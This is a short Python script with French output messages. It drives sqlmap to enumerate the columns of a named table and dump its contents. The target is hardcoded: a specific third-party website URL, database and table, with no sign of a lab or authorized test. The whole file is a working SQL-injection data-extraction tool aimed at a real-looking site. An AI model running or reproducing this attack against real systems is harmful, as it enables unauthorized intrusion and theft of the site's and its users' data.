import subprocess

def get_database_columns(url, db_name, table_name):
    command = [
        "python", "sqlmap/sqlmap.py", "-u", url, "--batch", "-D", db_name, "-T", table_name, "--columns"
    ]
    
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        output = result.stdout.split("\n")
        
        columns = []
        capture = False
        
        for line in output:
            if "Column names" in line:
                capture = True
                continue
            if capture and line.strip():
                columns.append(line.strip())
        
        return columns if columns else "Aucune colonne trouvée."
    except subprocess.CalledProcessError as e:
        return f"Erreur lors de l'exécution de sqlmap : {e}"

def dump_table_data(url, db_name, table_name):
    command = [
        "python", "sqlmap/sqlmap.py", "-u", url, "--batch", "-D", db_name, "-T", table_name, "--dump"
    ]
    
    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        return f"Erreur lors de l'exécution de sqlmap : {e}"

if __name__ == "__main__":
    target_url = "http://www.vadoinbici.com/it/recensione.php?id=1"
    database_name = "Sql521631_1"
    table_name = "app"
    
    print("Colonnes de la table:")
    print(get_database_columns(target_url, database_name, table_name))
    
    print("\nDonnées de la table:")
    print(dump_table_data(target_url, database_name, table_name))
